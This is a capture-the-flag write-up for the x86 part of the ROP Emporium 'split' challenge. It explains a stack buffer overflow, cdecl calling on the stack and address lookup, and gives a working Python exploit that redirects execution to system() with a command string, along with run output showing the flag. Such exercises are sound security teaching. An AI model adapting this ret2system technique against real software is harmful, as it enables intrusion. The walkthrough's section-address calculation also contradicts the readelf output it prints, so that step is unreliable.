---
title: "ROP Emporium - split"
categories: [Binary, Exploitation]
tags: [x86, x86-64, ARMv5, ARM, MIPS]

---

The binary includes a hidden useful string `"/bin/cat flag.txt"` and a call to `system()`. Your task is to build a ROP chain to call `system()` with that string to get the flag. This challenge introduces you to **Return-Oriented Programming (ROP)** and teaches you how to call existing functions in a binary by exploiting a simple buffer overflow.


## x86 (`split32`)

Here’s the decompiled `main` function from IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts("split by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

The program just prints some text and then calls the `pwnme` function, where user interaction happens.

Decompilation of `pwnme`:

```c
int pwnme()
{
  _BYTE s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, s, 0x60u);
  return puts("Thank you!");
}
```

- The program reads **96 bytes (`0x60`)** into a buffer `s` that is only **40 bytes** large.
- This leads to a **classic buffer overflow** vulnerability.

As we’ve seen in earlier challenges, after filling **40 bytes** of buffer space, we overwrite **EBP** (the saved base pointer), followed by the **return address (EIP)**.
Same offset we have in this case ;)

We can verify that -

```python
#!/usr/bin/python3
import sys

payload = b'A'*40
payload += b'B'*0x4 # RBP
payload += b'C'*0x4 # RIP

sys.stdout.buffer.write(payload)
```


```bash
./exp.py > exp.txt
```

We can verify our calculation in GDB -

```bash
gdb ./split32 
pwndbg> r < exp.txt 

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────
 EAX  0xb
 EBX  0xf7f90000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xf7f919b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd5d4 —▸ 0xffffd7a8 ◂— '/home/fury/Desktop/Challs/CTF/pwn/rop_emporium/2-split/1-32bit/split32'
 EBP  0x42424242 ('BBBB')
 ESP  0xffffd500 ◂— 1
 EIP  0x43434343 ('CCCC')
─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
Invalid address 0x43434343

```

If you’re finding it difficult to fully grasp how offset calculation works with cyclic patterns, don’t worry! I’ve covered this topic in detail in an earlier blog post, where I explain step by step how to:

- Generate cyclic patterns.
- Calculate the exact offset.

👉 You can refer to that blog here: 
[How to Use Cyclic Patterns for Offset Calculation](https://nyxfault.github.io/posts/ROP_Emporium_01/#offset-hunting)

We need to call `system()` to execute `/bin/cat flag.txt`. But before we proceed, let’s briefly understand **how a function call works in x86**, because this process is **architecture-dependent** — or more specifically, depends on the **ABI** (Application Binary Interface) used by the binary.


### How Function Calls Work in x86 (32-bit)

In **x86 (32-bit)** binaries, most function calls follow the **cdecl calling convention**, which is the default in many C programs on Linux.

Here’s how it works:

1. **Arguments** are passed on the **stack** in **reverse order** (right-to-left).
2. The **caller** (the function making the call) is responsible for cleaning the stack after the call.
3. The **return address** is automatically pushed onto the stack by the `call` instruction.
4. The function retrieves arguments from the stack relative to the base pointer (`EBP`).


Here’s how the stack would look right before calling `system()`:

```txt
| Padding (Overflow)                |
| system() address (EIP)            | <-- Overwrite EIP (redirect execution)
| Dummy Return Address              | <-- After system() returns (not important here)
| Address of "/bin/cat flag.txt"    | <-- Argument to system()

```

Here is a simple C program that will help you better understand how function calls work and how arguments are passed on the stack in **x86 (32-bit)** systems:

*demo.c*
```c
#include <stdio.h>

void myfunc(int a, int b, int c, int d) {
    printf("a = 0x%x\n", a);
    printf("b = 0x%x\n", b);
    printf("c = 0x%x\n", c);
    printf("d = 0x%x\n", d);
}

int main() {
    myfunc(0xdead, 0xbeef, 0xcafe, 0xbabe);
    return 0;
}

```

**Compile and Run**
```bash
gcc demo.c -m32 -o demo
./demo
a = 0xdead
b = 0xbeef
c = 0xcafe
d = 0xbabe
```


Let’s load the binary in GDB and set a breakpoint at `myfunc`:

```bash
gdb ./demo
```

Inside GDB:

```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x56556209 <+0>:	lea    ecx,[esp+0x4]
#...
   0x56556233 <+42>:	push   0xdead
   0x56556238 <+47>:	call   0x5655619d <myfunc>
   0x5655623d <+52>:	add    esp,0x10
#...
pwndbg> disass myfunc 
Dump of assembler code for function myfunc:
   0x0000119d <+0>:	push   ebp
   0x0000119e <+1>:	mov    ebp,esp
pwndbg> b *myfunc 
Breakpoint 1 at 0x119d
pwndbg> run
```

**NOTE** After calling `myfunc`, the program will return to `0x5655623d`.

Once the breakpoint at `myfunc` hits, we can inspect the stack:

```bash
pwndbg> stack 6
00:0000│ esp 0xffffd4ec —▸ 0x5655623d (main+52) ◂— add esp, 0x10
01:0004│-018 0xffffd4f0 ◂— 0xdead
02:0008│-014 0xffffd4f4 ◂— 0xbeef
03:000c│-010 0xffffd4f8 ◂— 0xcafe
04:0010│-00c 0xffffd4fc ◂— 0xbabe
05:0014│-008 0xffffd500 ◂— 1
```

| Stack Entry  | Description                                                       |
| ------------ | ----------------------------------------------------------------- |
| `0x5655623d` | Return address — where execution returns after `myfunc` finishes. |
| `0xdead`     | 1st argument (`a`) — passed to `myfunc`.                          |
| `0xbeef`     | 2nd argument (`b`).                                               |
| `0xcafe`     | 3rd argument (`c`).                                               |
| `0xbabe`     | 4th argument (`d`).                                               |

**Now, I Guess the Picture Is Clear!**

By now, the stack structure and argument passing mechanism should be clear.

Next, we need to find the **address of the string `/bin/cat flag.txt`** inside the binary. This string is already present in the binary, as hinted in the challenge description.

We can easily locate it using the `strings` command:

```bash
strings -a -t x split32  | grep flag
   1030 /bin/cat flag.txt
```

Here’s what’s happening:

- `-a`: Scan the entire binary, including non-printable sections.
- `-t x`: Show the offset in **hexadecimal**.

At first glance, it might seem like `0x1030` is the address of the string.  
However, that number is not a **memory address**—it’s just the **file offset** where the string exists inside the binary on disk.

When the program runs, the operating system loads parts of the binary (called **sections**) into memory at specific **virtual addresses** defined in the ELF headers.

We can check the ELF sections using `readelf`:

```bash
readelf --sections split32
# ...
  [16] .rodata           PROGBITS        080486a8 0006a8 00006e 00   A  0   0  4
# ...
```

Here:

- **Virtual Address:** `0x0804a000`
- **File Offset:** `0x1000`

Our string was found by `strings` at **file offset `0x1030`**.

We can calculate the offset within the `.rodata` section:
```txt
0x1030 - 0x1000 = 0x30
```

Then we will add this offset to the **virtual address** of `.rodata`:

```txt
0x0804a000 + 0x30 = 0x0804a030
```

This gave us the correct **runtime memory address**: `0x0804a030`.

So anything inside this section can be addressed by:

```txt
Virtual Address = Section Base Address + (String File Offset - Section File Offset)
```

Okay, I know calculating addresses manually using `readelf` and offsets might feel boring.

But let’s be honest—there’s an easier (and faster) way to get the exact address!

You can simply use **GDB** (with pwndbg) or tools like **IDA** to locate the string directly in memory.

```bash
gdb ./split32
pwndbg> b main
pwndbg> run
pwndbg> search -t string "/bin/cat flag.txt"
Searching for string: b'/bin/cat flag.txt\x00'
split32         0x804a030 '/bin/cat flag.txt'
```

We can easily get the address of `system` using **GDB** or **objdump**

```bash
pwndbg> p system
$1 = {<text variable, no debug info>} 0x80483e0 <system@plt>
```

This shows that the address of `system` in the binary is `0x080483e0`.

At this point, you don’t need to worry about what **PLT** means if you’re unfamiliar with it—we’ll cover it in detail later. For now, just remember that this is the correct address we can use to call `system()` in our exploit.

Alternatively, you can use `objdump` to disassemble the binary and grep for `system`:

```bash
objdump -d split32 | grep system
080483e0 <system@plt>:
 804861a:	e8 c1 fd ff ff       	call   80483e0 <system@plt>
```

Use the following exploit -

**TIP**

When crafting exploits for **x86 (32-bit)** binaries, remember that addresses need to be written in **little-endian** format (least significant byte first).

You can easily do this in Python using `struct.pack`:

```python
import struct
print(struct.pack("<I", 0xdeadbeef))
```

- `"<I"` means **little-endian unsigned integer (4 bytes)**.

```python
#!/usr/bin/python3
import sys
import struct

payload = b'A' * 40                     # Padding to overflow buffer (40 bytes)
payload += b'B' * 4                     # Overwrite saved EBP (optional placeholder)
payload += struct.pack("<I", 0x80483e0) # Address of system() function
payload += struct.pack("<I", 0xdeadbeef) # Dummy return address (won't be used)
payload += struct.pack("<I", 0x804a030)  # Address of "/bin/cat flag.txt" string (argument for system)

sys.stdout.buffer.write(payload)

```


```bash
./exp.py > exp.txt
cat exp.txt | ./split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)

```

When we run our exploit, we’re calling `system()`, which internally creates a **child process** (like spawning `/bin/sh` or executing a command).

By default, **GDB** follows the child process when a fork happens.

Here’s how you can do that in **GDB**:

```bash
pwndbg> set follow-fork-mode parent 
pwndbg> r < exp.txt 
```

This way, after `system()` runs, GDB won’t follow the child process (like `/bin/cat`), and you’ll remain inside the parent program to see exactly where it returns.

```bash
Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────
 EAX  0
 EBX  0xf7f90000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xffffd204 ◂— 0
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd5d4 —▸ 0xffffd7a8 ◂— '/home/fury/Desktop/Challs/CTF/pwn/rop_emporium/2-split/1-32bit/split32'
 EBP  0x42424242 ('BBBB')
 ESP  0xffffd504 —▸ 0x804a030 (usefulString) ◂— '/bin/cat flag.txt'
 EIP  0xdeadbeef
─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
Invalid address 0xdeadbeef

```

When we run our exploit under GDB, after successfully executing `system("/bin/cat flag.txt")`, we see a **segmentation fault**.
After `system()` finishes executing the command, it tries to return to the address we placed on the stack—in this case, `0xdeadbeef`.  
Since this isn’t a valid memory address, the program crashes with a **segmentation fault** when it tries to execute code at that address.

